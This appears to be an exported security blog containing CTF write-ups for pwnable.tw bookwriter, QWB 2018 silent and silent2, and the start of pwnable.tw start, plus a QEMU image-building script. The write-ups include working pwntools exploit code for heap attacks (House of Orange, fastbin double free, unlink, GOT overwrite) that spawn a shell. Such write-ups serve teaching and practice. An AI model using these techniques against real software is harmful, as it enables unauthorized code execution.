<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">size += nextsize;</span><br><span class="line">set_head(p, size | PREV_INUSE);</span><br><span class="line">av-&gt;top = p;</span><br></pre></td></tr></table></figure>

<p>所以，当fastbin中有两个不同大小的chunk时，能使top chunk的bk和fd指向<code>main_arena</code>。</p>
]]></content>
      <tags>
        <tag>heap</tag>
        <tag>libc</tag>
        <tag>ptmalloc</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable tw bookwriter writeup</title>
    <url>/2018/07/02/pwnable-tw-bookwriter/</url>
    <content><![CDATA[<p>This pwn need to use Unsorted Bin Attack and House Of Orange to exploit. First, I would like to introduce Unsorted Bin Attack, House Of Orange and some relevant technique.</p>
<h4 id="0x01-Unsorted-Bin-Attack"><a href="#0x01-Unsorted-Bin-Attack" class="headerlink" title="0x01 Unsorted Bin Attack"></a>0x01 Unsorted Bin Attack</h4><p>Environment: I use 64 bit to make example.</p>
<p>Condition: Control unsorted chunk’s bk pointer.</p>
<p>Unsorted Bin uses FIFO strategy.</p>
<a id="more"></a>

<p>Steps:</p>
<ul>
<li>Set free unsorted chunk’s pointer to target_addr - 0x10, this chunk will be the first free chunk in Unsorted Bin.</li>
<li>Call malloc, the first free chunk will be put into the corresponding bin.</li>
<li>Then the operations below will be performed:</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = unsorted_bin(av)-&gt;bk = p;</span><br><span class="line">bck = victim-&gt;bk = target_addr - <span class="number">0x10</span>; <span class="comment">// victim-&gt;bk is p-&gt;bk</span></span><br><span class="line">unsorted_bin(av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_bin(av);            <span class="comment">// bck-&gt;fd is *(target_addr)</span></span><br></pre></td></tr></table></figure>

<p>So, use Unsorted Bin Attack can set target_addr’s value to <code>main_arean+88</code>.</p>
<h4 id="0x02-FSOP"><a href="#0x02-FSOP" class="headerlink" title="0x02 FSOP"></a>0x02 FSOP</h4><p>FSOP(File-Stream Oriented Programming), like ROP and SROP, but it use FILE struct to construct the exploit chain. One of the use of FSOP is House Of Orange.</p>
<p>FSOP mainly use <code>_IO_ﬂush_all_lockp</code> function, it flushes all standard I/O stream before process being terminated. It travels all FILE struct by element _chain pointer. The code:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">	  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">	  last_stamp = _IO_list_all_stamp;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp = fp-&gt;_chain; <span class="comment">// travel by _chain</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>According to the code above, <code>_IO_flush_all_lockp</code> which called by <code>abort</code>  will call<code>_IO_OVERFLOW (fp, EOF)</code>, and we can hijack 用<code>_IO_OVERFLOW</code> through FILE struct’s vtable. There are 3 situations that program will call <code>abort</code>:</p>
<ul>
<li>glibc abort</li>
<li>exit function</li>
<li>main return</li>
</ul>
<p>When there occurs some errors in <code>malloc</code>, it will call <code>malloc_printerr</code> and then <code>malloc_printerr</code> calls <code>abort</code>.</p>
<p>This exploit makes advantage of changing <code>_IO_list_all</code> and forges <code>vtable</code> which includes <code>_IO_OVERFLOW</code> pointer.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> <span class="title">FILE</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="0x03-Pwnable-tw-bookwriter"><a href="#0x03-Pwnable-tw-bookwriter" class="headerlink" title="0x03 Pwnable.tw bookwriter"></a>0x03 Pwnable.tw bookwriter</h4><h5 id="leak-libc-information-and-heap-address"><a href="#leak-libc-information-and-heap-address" class="headerlink" title="leak libc information and heap address"></a>leak libc information and heap address</h5><p>At the beginning of the program, pwner needs to input the name of author on <code>bss_0x602060</code> which behind the chunk_list(<code>bss_0x6020A0</code>). Pwner can input a string of length 0x40 without \x00, when program output the author’s name, the heap address leaks.</p>
<p>In <code>Edit()</code> function, there are two lines of code following, in <code>InputString()</code> function, it doesn’t end up input string with \x00 which leads to larger string length.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">InputString((__int64)CHUNK_LIST[idx], SIZE_LIST[idx]);</span><br><span class="line">SIZE_LIST[idx] = <span class="built_in">strlen</span>(CHUNK_LIST[idx]);</span><br></pre></td></tr></table></figure>

<p>The first part of expolit:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    p = process(<span class="string">&#x27;./bookwriter&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Author :&#x27;</span>)</span><br><span class="line">    <span class="comment"># input auther name of length 0x40 without \x00</span></span><br><span class="line">    p.send(<span class="string">&#x27;A&#x27;</span> * <span class="number">0x40</span>)</span><br><span class="line">    </span><br><span class="line">    Add(p, <span class="number">0x18</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x18</span>) <span class="comment"># 0</span></span><br><span class="line">    sleep(<span class="number">0.3</span>)</span><br><span class="line">    <span class="comment"># extend size of chunk 0</span></span><br><span class="line">    Edit(p, <span class="number">0</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x18</span>)</span><br><span class="line">    <span class="comment"># overflow top chunk size and let its size to be 0xfe1</span></span><br><span class="line">    Edit(p, <span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x18</span> + <span class="string">&#x27;\xe1\x0f\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak heap address by author name</span></span><br><span class="line">    recv = Info(p, null, <span class="number">0</span>)</span><br><span class="line">    heap_addr = u64(recv[<span class="string">&#x27;old_author&#x27;</span>][<span class="number">0x40</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x10</span></span><br><span class="line">    <span class="keyword">print</span> hex(heap_addr)</span><br></pre></td></tr></table></figure>

<p>But how to leak libc information while there is no <code>free()</code> in the program? </p>
<p>When user malloc a chunk whose size is larger than top chunk, the program will call <code>sysmalloc()</code> and free the top chunk into unsorted bin. Then the top chunk fd and bk will point to the address which is relevant with  <code>main_arena</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># trigger free in sysmalloc, now the top chunk size is 0xfe1</span></span><br><span class="line">Add(p, <span class="number">0x1000</span>, <span class="string">&#x27;sunichi&#x27;</span>) <span class="comment"># 1 0x1000 &gt; 0xfe1</span></span><br><span class="line">Add(p, <span class="number">0x40</span>, <span class="string">&#x27;sunichi!&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line">recv = View(p, <span class="number">2</span>)</span><br><span class="line">main_arena_88 = u64(recv[<span class="number">8</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base_addr = main_arena_88 - <span class="number">0x3c4b78</span> - (<span class="number">1640</span> - <span class="number">88</span>)</span><br><span class="line">system_addr = libc_base_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">io_list_all_addr = libc_base_addr + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h5 id="unsorted-bin-attack-and-perform-house-of-orange-to-get-the-shell"><a href="#unsorted-bin-attack-and-perform-house-of-orange-to-get-the-shell" class="headerlink" title="unsorted bin attack and perform house of orange to get the shell"></a>unsorted bin attack and perform house of orange to get the shell</h5><p>Now, we know the heap and libc address and the next step is to perform unsorted bin attack.</p>
<p>First, construct a chunk of size 0x61. When it comes to <code>malloc(1)</code>, the fake chunk will be put into fastbin[4]. Use unsorted bin attack, <code>_IO_list_all</code> will be changed to <code>main_arena+88</code>. After the fake chunk being put into fastbin[4], the <code>malloc()</code> will continue to find the next free unsorted chunk. Because next chunk’s size is 0, <code>malloc()</code> then triggers <code>printerr()</code>. So the program searches the FILE struct from <code>_IO_list_all</code> whose value is already <code>main_arena+88</code> and calls <code>FILE_OVERFLOW()</code>.</p>
<p>The first FILE struct is invalid, and through the <code>main_arena+88-&gt;_chain</code>(<code>main_arena+216</code>), the program will find the next FILE struct whose address is fastbin[4]’s first chunk which is forged by pwner. So the following code will be triggered:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">FILE_OVERFLOW(fp, EOF) =&gt; system(fp) =&gt; system(&#x27;/bin/sh&#x27;)</span><br></pre></td></tr></table></figure>

<p>The last part of exploits:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Index overflow, the size of chunk[0] will be changed to heap address</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x3</span>, <span class="number">0x9</span>):</span><br><span class="line">      Add(p, <span class="number">0x20</span>, str(i) * <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">  vtable_addr = heap_addr + <span class="number">0x248</span></span><br><span class="line"></span><br><span class="line">  payload = <span class="number">0x170</span> * <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">  fake_stream = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">  fake_stream += p64(<span class="number">0</span>) + p64(io_list_all_addr - <span class="number">0x10</span>) <span class="comment"># unsorted bin attack</span></span><br><span class="line">  fake_stream = fake_stream.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">  fake_stream += p64(heap_addr + <span class="number">0x250</span>)</span><br><span class="line">  fake_stream = fake_stream.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">  fake_stream += p64(<span class="number">1</span>) + <span class="number">2</span> * p64(<span class="number">0</span>) + p64(vtable_addr)</span><br><span class="line"></span><br><span class="line">  payload += fake_stream</span><br><span class="line">  payload += p64(<span class="number">2</span>)</span><br><span class="line">  payload += p64(<span class="number">3</span>)</span><br><span class="line">  payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">  Edit(p, <span class="number">0</span>, payload)</span><br><span class="line">  </span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">  p.sendline(str(<span class="number">1</span>))</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Size of page :&#x27;</span>)</span><br><span class="line">  p.sendline(str(<span class="number">0x10</span>))</span><br><span class="line">  p.interactive()</span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<h5 id="Relevant-Article"><a href="#Relevant-Article" class="headerlink" title="Relevant Article"></a>Relevant Article</h5><p><a href="https://bbs.pediy.com/thread-223334.htm">https://bbs.pediy.com/thread-223334.htm</a></p>
<p><a href="http://weaponx.site/2018/06/11/BookWriter-Writeup-pwnable-tw/">http://weaponx.site/2018/06/11/BookWriter-Writeup-pwnable-tw/</a></p>
<p><a href="http://veritas501.space/2018/03/04/pwnable.tw%2011~18%E9%A2%98%20writeup/">http://veritas501.space/2018/03/04/pwnable.tw%2011~18%E9%A2%98%20writeup/</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>pwnable-tw</tag>
      </tags>
  </entry>
  <entry>
    <title>QEMU &amp; create-image.sh</title>
    <url>/2020/04/03/qemu-image-maker/</url>
    <content><![CDATA[<p>在网上看的一些debootstrap脚本运行都有问题，综合了几篇博客内容稍微修改出了一份可以使用国内mirror成功制作镜像的脚本。</p>
<a id="more"></a>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir rootfs</span><br><span class="line"></span><br><span class="line">sudo debootstrap --include=openssh-server,curl,tar,gcc,\</span><br><span class="line">libc6-dev,time,strace,sudo,less,psmisc,\</span><br><span class="line">selinux-utils,policycoreutils,checkpolicy,selinux-policy-default \</span><br><span class="line">--foreign --no-check-gpg stretch rootfs http://mirrors.tuna.tsinghua.edu.cn/debian</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> rootfs</span><br><span class="line">LC_ALL=C LANGUAGE=C LANG=C chroot . /debootstrap/debootstrap --second-stage</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -eux</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Set some defaults and enable promtless ssh to the machine for root.</span></span><br><span class="line">sudo sed -i <span class="string">&#x27;/^root/ &#123; s/:x:/::/ &#125;&#x27;</span> rootfs/etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100&#x27;</span> | sudo tee -a rootfs/etc/inittab</span><br><span class="line"><span class="comment">#printf &#x27;\nauto enp0s3\niface enp0s3 inet dhcp\n&#x27; | sudo tee -a qemu/etc/network/interfaces</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;\nallow-hotplug enp0s3\niface enp0s3 inet dhcp\n&#x27;</span> | sudo tee -a rootfs/etc/network/interfaces</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;debugfs /sys/kernel/debug debugfs defaults 0 0&#x27;</span> | sudo tee -a rootfs/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;kernel.printk = 7 4 1 3&quot;</span> | sudo tee -a rootfs/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;debug.exception-trace = 0&#x27;</span> | sudo tee -a rootfs/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;net.core.bpf_jit_enable = 1&quot;</span> | sudo tee -a rootfs/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;net.core.bpf_jit_harden = 2&quot;</span> | sudo tee -a rootfs/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;net.ipv4.ping_group_range = 0 65535&quot;</span> | sudo tee -a rootfs/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">&quot;127.0.0.1\tlocalhost\n&quot;</span> | sudo tee rootfs/etc/hosts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nameserver 8.8.8.8&quot;</span> | sudo tee -a rootfs/etc/resolve.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ubuntu&quot;</span> | sudo tee rootfs/etc/hostname</span><br><span class="line">sudo mkdir -p rootfs/root/.ssh/</span><br><span class="line">rm -rf ssh</span><br><span class="line">mkdir -p ssh</span><br><span class="line">ssh-keygen -f ssh/id_rsa -t rsa -N <span class="string">&#x27;&#x27;</span></span><br><span class="line">cat ssh/id_rsa.pub | sudo tee rootfs/root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Build a disk image</span></span><br><span class="line">dd <span class="keyword">if</span>=/dev/zero of=rootfs.img bs=1M seek=2047 count=1</span><br><span class="line">sudo mkfs.ext4 -F rootfs.img</span><br><span class="line">sudo mkdir -p /mnt/rootfs</span><br><span class="line">sudo mount -o loop rootfs.img /mnt/rootfs</span><br><span class="line">sudo cp -a rootfs/. /mnt/rootfs/.</span><br><span class="line">sudo umount /mnt/rootfs</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考博客：</p>
<p><a href="https://ray-cp.github.io/archivers/qemu-pwn-cve-2015-5165%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">https://ray-cp.github.io/archivers/qemu-pwn-cve-2015-5165%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</a></p>
<p><a href="https://raspberrypi.club/391.html">https://raspberrypi.club/391.html</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>qemu</tag>
        <tag>linux&#39;</tag>
        <tag>debootstrap</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯 2018 pwn silent writeup</title>
    <url>/2018/04/15/qwb18-pwn-silent/</url>
    <content><![CDATA[<p>保护措施：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>使用IDA查看程序，发现此题存在Double Free，可以进行fastbin attack，并修改free@got的地址为system后获取shell。</p>
<a id="more"></a>

<p>该题一开始会执行下列指令：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&quot;cat banner.txt&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>使用gdb进行调试的时候这里有一个坑（不过在这里调用了一次system应该是方便了后面的漏洞利用），gdb默认会去调试子进程，导致无法继续调试主进程，因此需要设置gdb：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set follow-fork-mode parent</span><br></pre></td></tr></table></figure>

<p>首先申请3个fastbin chunk：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">New(<span class="number">0x50</span>, <span class="string">&#x27;Hack by sunichi&#x27;</span>)  <span class="comment"># chunk_0</span></span><br><span class="line">New(<span class="number">0x50</span>, <span class="string">&#x27;Hack by sunichi&#x27;</span>)  <span class="comment"># chunk_1</span></span><br><span class="line">New(<span class="number">0x50</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)      <span class="comment"># chunk_2</span></span><br></pre></td></tr></table></figure>

<p>为什么要选取0x50作为chunk的大小？因为在got表起始地址附近，能作为fastbin chunk的size的数据只有0x602002处的0xe168000000000060。malloc函数被调用时，会使用unsigned int对size做类型转换，在这里size就被转换成了0x60，与我们申请的0x50（content）+0x10（chunk头）大小的chunk一致。</p>
<p>随后进行fastbin attack：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>三次释放后，header -&gt; 0 -&gt; 1 -&gt; 0 -&gt; 0x00。接着我们申请fastbin chunk：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">New(<span class="number">0x50</span>, p64(<span class="number">0x601ffa</span>)) <span class="comment"># 0x602002 - 8</span></span><br><span class="line"><span class="comment"># header -&gt; 1 -&gt; 0 -&gt; 0x601ffa</span></span><br><span class="line">New(<span class="number">0x50</span>, <span class="string">&#x27;Hack by sunichi&#x27;</span>)</span><br><span class="line"><span class="comment"># header -&gt; 0 -&gt; 0x601ffa</span></span><br><span class="line">New(<span class="number">0x50</span>, <span class="string">&#x27;Hack by sunichi&#x27;</span>)</span><br><span class="line"><span class="comment"># header -&gt; 0x601ffa</span></span><br><span class="line">New(<span class="number">0x50</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">14</span> + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])) <span class="comment"># Overwrite free@got</span></span><br></pre></td></tr></table></figure>

<p>接着调用system函数，由于我们第1次申请的chunk_2的content中为字符串/bin/sh，因此此时调用free(chunk_2)等于system(‘/bin/sh’)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>qwb</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯 2018 pwn silent2 writeup</title>
    <url>/2018/04/16/qwb18-pwn-silent2/</url>
    <content><![CDATA[<p>保护措施：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>此题与silent几乎完全一致，仅是在malloc的时候做了大小限制：</p>
<a id="more"></a>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( size != <span class="number">0x10</span> &amp;&amp; size &lt;= <span class="number">127</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">v3 = <span class="built_in">malloc</span>(size);</span><br></pre></td></tr></table></figure>

<p>因此此题需要依靠unsorted bin和unlink漏洞进行利用。首先申请5个chunk：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">New(<span class="number">0x100</span>, <span class="string">&#x27;Hack by sunichi&#x27;</span>) <span class="comment"># chunk_0</span></span><br><span class="line">New(<span class="number">0x100</span>, <span class="string">&#x27;Hack by sunichi&#x27;</span>) <span class="comment"># chunk_1</span></span><br><span class="line">New(<span class="number">0x100</span>, <span class="string">&#x27;Hack by sunichi&#x27;</span>) <span class="comment"># chunk_2</span></span><br><span class="line">New(<span class="number">0x100</span>, <span class="string">&#x27;Hack by sunichi&#x27;</span>) <span class="comment"># chunk_3</span></span><br><span class="line">New(<span class="number">0x100</span>, <span class="string">&#x27;Hack by sunichi&#x27;</span>) <span class="comment"># chunk_4</span></span><br></pre></td></tr></table></figure>

<p>随后free chunk_3、chunk_4：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Delete(<span class="number">3</span>) <span class="comment"># size 0x110</span></span><br><span class="line">Delete(<span class="number">4</span>) <span class="comment"># size 0x110</span></span><br></pre></td></tr></table></figure>

<p>构造payload，0x6020c0为程序保存申请的chunk的地址的列表，首先我们要确保能通过unlink的安全检查，因此与0x6020c0有关的两个地址需要相差0x8，其次我们需要利用unlink改写列表中的值，进而写入got表地址然后进行覆写，unlink能达到的效果是对目标地址（第3个p64）+0x18的位置上写入其自身，我们在这就可以将list[3]的值替换为list[0]的地址，因此第三个p64的地址为target_addr - 0x18。填充完后，伪造chunk，prev_size为0x100，size为0x100：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(<span class="number">0x6020c0</span> + <span class="number">0x18</span> - <span class="number">0x18</span>) + p64(<span class="number">0x6020c0</span> + <span class="number">0x18</span> - <span class="number">0x10</span>) + <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x100</span> - <span class="number">0x20</span>) + p64(<span class="number">0x100</span>) + p64(<span class="number">0x110</span>)</span><br><span class="line">New(<span class="number">0x210</span>, payload) <span class="comment"># chunk_5</span></span><br></pre></td></tr></table></figure>

<p>Double Free并且通过编辑chunk_3将list[0]改写为free@got，然后将system@plt写入free@got：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Delete(<span class="number">4</span>)</span><br><span class="line">Edit(<span class="number">3</span>, p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">Edit(<span class="number">0</span>, p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br></pre></td></tr></table></figure>

<p>拿到shell：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">New(<span class="number">0x100</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># chunk_6</span></span><br><span class="line">Delete(<span class="number">6</span>) <span class="comment"># Get shell</span></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>qwb</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwnable.tw start writeup</title>
    <url>/2018/01/05/pwnable-tw-start/</url>
    <content><![CDATA[<p>使用ida查看程序，首先保存esp和_exit地址，随后将输出的字符串压栈：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push esp</span><br><span class="line">push offset _exit</span><br><span class="line">xor eax, eax ; ebx, ecx, edx</span><br><span class="line">push &#39;Let&#39;s start the CTF:&#39;</span><br><span class="line">mov ecx esp ; addr</span><br><span class="line">mov dl, 14h ; len</span><br><span class="line">mov bl, 1   ; fd</span><br><span class="line">mov al, 4   ; syscall num, write</span><br><span class="line">int 80h</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>随后执行输入函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xor ebx, ebx ; fd</span><br><span class="line">mov dl, 3Ch  ; len</span><br><span class="line">mov al, 3    ; syscall num, put</span><br><span class="line">int 80h</span><br></pre></td></tr></table></figure>

<p>由于ecx在之前已经被赋值为esp，所以<code>put</code>函数仍是对同一个变量（输出的字符串）进行输入。使用<code>gdb-peda</code>的<code>checksec</code>查看，虽然显示<code>NX: enable</code>，但是通过<code>vmmap</code>执行，发现栈是可执行的。使用<code>pattern create</code>和<code>pattern offset</code>获取偏移量为20。因此构造的payload结构如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#x27;a&#x27; * 20 + [ret addr] + getshell</span><br></pre></td></tr></table></figure>

<p>因为要获取栈的地址来达到ret2shellcode的目的，所以需要通过<code>write</code>泄漏栈地址。在程序运行的开始，执行了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push esp</span><br><span class="line">push offset _exit</span><br></pre></td></tr></table></figure>

<p>在put函数后，执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add esp, 14h</span><br><span class="line">ret ;pop esp</span><br></pre></td></tr></table></figure>

